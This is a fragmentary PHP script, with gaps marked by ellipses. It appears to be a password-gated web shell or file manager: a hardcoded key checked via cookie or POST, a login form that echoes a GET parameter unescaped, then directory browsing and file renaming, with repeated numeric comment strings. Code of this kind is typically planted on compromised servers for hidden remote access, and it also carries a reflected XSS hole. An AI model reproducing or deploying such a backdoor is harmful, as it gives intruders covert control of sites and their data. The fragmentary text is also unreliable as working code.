...
$auth_key = "87ffbaf2817641ebda86ccba1c60c03a";
...
$pass = false;
if (isset($_COOKIE['pw_name_89250'])) {
    if(($_COOKIE['pw_name_89250']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_89250'])) {
        if(($_POST['pw_name_89250']) == $auth_key) {
            setcookie("pw_name_89250", $_POST['pw_name_89250']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_89250' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774398962 1724682774290778 1724682774890673 1724682774465395
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774398962 1724682774290778 1724682774890673 1724682774465395
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774398962 1724682774290778 1724682774890673 1724682774465395
            $name = PATH . "/" . $_GET['r'];
